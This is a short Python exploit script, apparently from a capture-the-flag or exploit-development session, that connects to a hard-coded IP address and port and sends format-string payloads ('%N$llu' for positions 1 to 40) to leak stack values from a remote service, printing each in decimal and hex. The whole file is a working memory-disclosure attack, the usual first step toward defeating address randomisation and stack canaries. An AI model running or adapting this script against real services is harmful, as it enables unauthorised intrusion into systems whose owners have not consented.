#!/usr/bin/env python3
import socket, time, re
HOST="144.79.188.39"; PORT=43642

def conn():
    s=socket.socket(); s.settimeout(1.5); s.connect((HOST,PORT)); s.recv(300); return s

def test(txt):
    try:
        s=conn()
        s.send(txt)
        d=b''
        try:
            while True:
                c=s.recv(4096)
                if not c: break
                d+=c
        except Exception: pass
        s.close(); return d
    except Exception as e:
        return b'ERR:'+str(e).encode()

def leak_llu(n):
    r = test(("%%%d$llu\n" % n).encode())
    time.sleep(0.05)
    return r

print("=== args as %llu ===")
for n in range(1, 41):
    r = leak_llu(n)
    s = r.decode(errors="replace").strip()
    # first token on the echoed line (the printed value)
    m = re.search(rb'(?m)^>?\s*([0-9]+)\n', r)
    val = None
    if m: val = int(m.group(1))
    if val is not None:
        print(f"{n}: {val}  (0x{val:x})")
    else:
        print(f"{n}: RAW {r!r}")
